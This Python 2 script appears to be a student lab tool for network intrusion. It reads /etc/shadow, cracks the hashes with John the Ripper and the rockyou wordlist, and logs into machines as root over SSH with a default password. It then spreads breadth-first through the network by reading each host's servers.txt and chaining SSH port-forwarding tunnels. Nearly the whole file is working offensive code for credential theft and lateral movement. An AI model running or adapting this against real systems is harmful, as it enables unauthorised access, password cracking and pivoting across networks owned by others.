import paramiko
import os
import socket
import select
import subprocess
import Queue
try:
    import SocketServer
except ImportError:
    import socketServer as SocketServer

import sys
import threading

g_verbose = True

WORDLIST = "/usr/share/wordlists/rockyou.txt"
DEFAULT_PASS = "student"
ROOT = "root"

q = Queue.Queue()
ip_list = []

FORWARD_PORT = 9050
initial_comps = 0

USERNAMES = ["root"]
PASSWORDS = []

class Computer:
    def __init__(self, ip, ssh_port):
        # ip address of the machine
        self.host = ip
        # port where SSH server is listening
        self.ssh_port = ssh_port
        # initialize as empty dict
        # keys = accountName
        # values = password
        self.accounts = {}
        self.local_forward = 0

    def __str__(self):
        print "IP:\t\t%s" % self.host
        print "\tSSH PORT:\t%d" % self.ssh_port
        print "\tLOCAL FORWARD\t%d" % self.local_forward
        print "\tACCOUNTS:\t\t%s" % self.accounts

class ForwardServer (SocketServer.ThreadingTCPServer):
    daemon_threads = True
    allow_reuse_address = True
    

class Handler (SocketServer.BaseRequestHandler):
    def handle(self):
        try:
            chan = self.ssh_transport.open_channel('direct-tcpip',
                                                   (self.chain_host, self.chain_port),
                                                   self.request.getpeername())
        except Exception as e:
            verbose('Incoming request to %s:%d failed: %s' % (self.chain_host,
                                                              self.chain_port,
                                                              repr(e)))
            return
        if chan is None:
            verbose('Incoming request to %s:%d was rejected by the SSH server.' %
                    (self.chain_host, self.chain_port))
            return

        verbose('Connected!  Tunnel open %r -> %r -> %r' % (self.request.getpeername(),
                                                            chan.getpeername(), (self.chain_host, self.chain_port)))
        while True:
            r, w, x = select.select([self.request, chan], [], [])
            if self.request in r:
                data = self.request.recv(1024)
                if len(data) == 0:
                    break
                chan.send(data)
            if chan in r:
                data = chan.recv(1024)
                if len(data) == 0:
                    break
                self.request.send(data)
                
        peername = self.request.getpeername()
        chan.close()
        self.request.close()
        verbose('Tunnel closed from %r' % (peername,))


def forward_tunnel(local_port, remote_host, remote_port, transport):
    # this is a little convoluted, but lets me configure things for the Handler
    # object.  (SocketServer doesn't give Handlers any way to access the outer
    # server normally.)
    class SubHander (Handler):
        chain_host = remote_host
        chain_port = remote_port
        ssh_transport = transport
    threading.Thread(target=ForwardServer(('', local_port), SubHander).serve_forever).start()

def verbose(s):
    if g_verbose:
        print(s)

def get_host_port(data):
    args = data.split(":")
    args[1] = int(args[1])
    return args

def begin_attack(client):
    global initial_comps, FORWARD_PORT
    print "Beginning attack"

    # executes BFS over network
    while not q.empty():
        # gets the next computer in BFS
        server = q.get()
        verbose("Connecting to ssh host %s:%d ..." % (server.host, server.ssh_port))
        try:
            if initial_comps > 0:
                initial_comps -= 1
                client.connect(server.host, server.ssh_port, username=ROOT, password=DEFAULT_PASS)
            else:
                client.connect("localhost", server.local_forward, username=ROOT, password=DEFAULT_PASS)
                verbose("ssh localhost:%d" % server.local_forward)

        except Exception as e:
            print('*** Failed to connect to %s:%d: %r' % (server.host, server.ssh_port, e))
            q.put(server)
            continue

        # at this point we are connected via SSH
        # gets the servers.txt
        stdin, stdout, stderr = client.exec_command("cat ~/servers.txt")
        new_servers = stdout.readlines()
        # print "%s\n\t%s" % (server.host, new_servers)
        new_servers = map(lambda x: x.strip(), new_servers)
        for s in new_servers:
            host, port = get_host_port(s)
            # if we have not seen this ip_address before
            if not (host in ip_list):
                # create the compObj and add it to be seen in the queue
                compObj = Computer(host, port)
                ip_list.append(host)
                # adds a new port for each tunnelling
                compObj.local_forward = FORWARD_PORT
                FORWARD_PORT += 1
                q.put(compObj)

                # set up forwarder to the new computer
                try:
                    forward_tunnel(compObj.local_forward, compObj.host, compObj.ssh_port, client.get_transport())
                    verbose('Now forwarding %s:%d to %s:%d ...' % ("localhost", compObj.local_forward, compObj.host, compObj.ssh_port))
                except Exception as e:
                    print e

    print "QUEUE EMPTY"


# shadow_file = file ptr
def user_hashes(shadow_file):
    shadow = shadow_file.readlines()

    # filters out the user accounts from the shadow files
    accts = []
    for s in shadow:
        if "$" in s:
            accts.append(s.strip())

    return accts
    

# cracks a list of hashes with John the Ripper and stores any new usernames and
# passwords in the global list of users/passwords
def crack_with_john(hashes_lst):
    global USERNAMES, PASSWORDS
    f = open("curr_hashes.txt", "w")
    # write each hash to the file so john can do its thingy thing
    for h in hashes_lst:
        f.write(h)
    f.close()

    print "Cracking newly found hashes..."

    # supress john output
    os.system("john --format=sha512crypt --wordlist %s curr_hashes.txt > /dev/null 2>&1" % (WORDLIST))
    # get only the user/pass output from john
    hashes = subprocess.Popen("john --show curr_hashes.txt | grep ':'", shell=True, stdout=subprocess.PIPE).communicate()[0]

    # split it into array
    hashes = hashes.split('\n')
    # for some reason subprocess.Popen adds a new line at the end of output
    hashes = hashes[:-1]
    # for each hash it finds
    for h in hashes:
        tokens = h.split(":")
        user = tokens[0]
        passwd = tokens[1]
        # add the username to the summary list
        if not (user in USERNAMES):
            USERNAMES.append(user)
            print "Adding %s to Username list" % user
        # add the password to the summary list
        if not (passwd in PASSWORDS):
            PASSWORDS.append(passwd)
            print "Adding %s to Password list" % passwd
    

if __name__ == "__main__":
    # init paramiko
    client = paramiko.SSHClient()
    client.load_system_host_keys()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())


    # get list of immediate computers
    f = open("servers.txt", "r")
    computers = f.readlines()
    f.close()

    # get initial user/pass shit for john the ripper
    f = open("/etc/shadow", "r")
    accts = user_hashes(f)
    f.close()

    print accts
    # output user hashes to a file so john can crack it
    crack_with_john(accts)

    print USERNAMES
    print PASSWORDS

    sys.exit(1)

    # initialize the queue with starting computer list
    for c in computers:
        initial_comps += 1
        host, port = get_host_port(c)
        compObj = Computer(host, port)
        ip_list.append(host)
        q.put(compObj)

    begin_attack(client)
